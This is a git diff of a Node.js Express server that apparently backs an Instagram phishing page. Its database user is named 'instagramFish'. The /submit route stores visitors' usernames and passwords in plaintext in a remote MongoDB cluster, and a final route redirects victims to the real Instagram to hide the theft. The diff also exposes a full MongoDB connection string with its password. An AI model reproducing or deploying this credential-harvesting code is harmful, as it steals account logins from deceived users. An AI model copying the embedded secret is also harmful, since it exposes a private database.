@@ -1,102 +1,87 @@
-const express= require("express");
-const app= express();
+const express = require("express");
+const app = express();
 const path = require('path');
-const ejs= require("ejs");
-const ejsMate= require("ejs-mate");
-const bodyParser= require("body-parser");
-const port= '3000';
-const nodemailer = require('nodemailer');
-const mongoose= require("mongoose");
-
-//vn5YGXosfDoUpAvN
-
+const ejs = require("ejs");
+const ejsMate = require("ejs-mate");
+const bodyParser = require("body-parser");
+const mongoose = require("mongoose");
+const port = '3000';
 const { MongoClient, ServerApiVersion } = require('mongodb');
-// mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.88hpa8h.mongodb.net/
+
+// MongoDB URI and client setup
 const uri = "mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.ltm5jm0.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
 
-// Create a MongoClient with a MongoClientOptions object to set the Stable API version
-const client = new MongoClient(uri, {
-  serverApi: {
-    version: ServerApiVersion.v1,
-    strict: true,
-    deprecationErrors: true,
-  }
+mongoose.connect(uri, {
+  useNewUrlParser: true,
+  useUnifiedTopology: true
+}).then(() => {
+  console.log("Connected to MongoDB via Mongoose!");
+}).catch(err => {
+  console.error("Failed to connect to MongoDB via Mongoose:", err.message);
 });
-async function run() {
-  try {
-    // Connect the client to the server	(optional starting in v4.7)
-    await client.connect();
-    // Send a ping to confirm a successful connection
-    await client.db("admin").command({ ping: 1 });
-    console.log("Pinged your deployment. You successfully connected to MongoDB!");
-  } finally {
-    // Ensures that the client will close when you finish/error
-    await client.close();
-  }
-}
-run().catch(console.dir);
 
-mongoose.connect(uri,{useNewUrlParser:true});
-
-
+// Define Mongoose schema and model
 const userSchema = new mongoose.Schema({
-    username: String,
-    password: String
+  username: {
+    type: String,
+    required: true
+  },
+  password: {
+    type: String,
+    required: true
+  }
 });
 
+const UserDetails = mongoose.model('UserDetails', userSchema);
 
-const UserDetails= mongoose.model('UserDetails', userSchema);
-
-
+// View engine setup
 app.engine('ejs', ejsMate);
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-
+// Middleware setup
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: false }));
 
-
-app.get("/",function(req,res){
+// Routes
+app.get("/", (req, res) => {
   res.render("index.ejs");
 });
 
-app.get("/report",function(req,res){
+app.get("/report", (req, res) => {
   res.render("bluetick.ejs");
 });
 
+// Handle form submission for new user
 app.post('/submit', async (req, res) => {
-  const uname=req.body.uname;
-  const password=req.body.password;
+  const { uname, password } = req.body;
 
-  console.log(uname);
-  console.log(password);
+  try {
+    const newUser = new UserDetails({
+      username: uname,
+      password: password
+    });
 
+    // Save the new user to MongoDB
+    await newUser.save();
+    console.log('User saved:', newUser);
 
-  const newUser = new UserDetails({
-    username: uname,
-    password: password
-  });
-  // Save the user to the database
-  newUser.save().then((savedUser) => {
-    console.log('User saved:', savedUser);
-  }).catch((error) => {
-    // Handle validation errors and other errors
-    if (error.name === 'ValidationError') {
-      console.error('Validation error:', error.message);
-    } else {
-      console.error('Error saving user:', error);
-    }
-  });
-  res.redirect("/report");
-  
+    // Redirect to the report page
+    res.redirect("/report");
+
+  } catch (error) {
+    console.error('Error saving user:', error.message);
+    res.status(500).send("Internal Server Error. Unable to save user.");
+  }
 });
 
-app.post("/finalsubmit",function(req,res){
-  console.log("hello");
+// Final submit - redirects to Instagram
+app.post("/finalsubmit", (req, res) => {
+  console.log("Final submission received");
   res.redirect("https://www.instagram.com/");
 });
 
-app.listen(port,()=>{
-  console.log('listening to port '+ port);
+// Start the server
+app.listen(port, () => {
+  console.log('Server is running on port ' + port);
 });
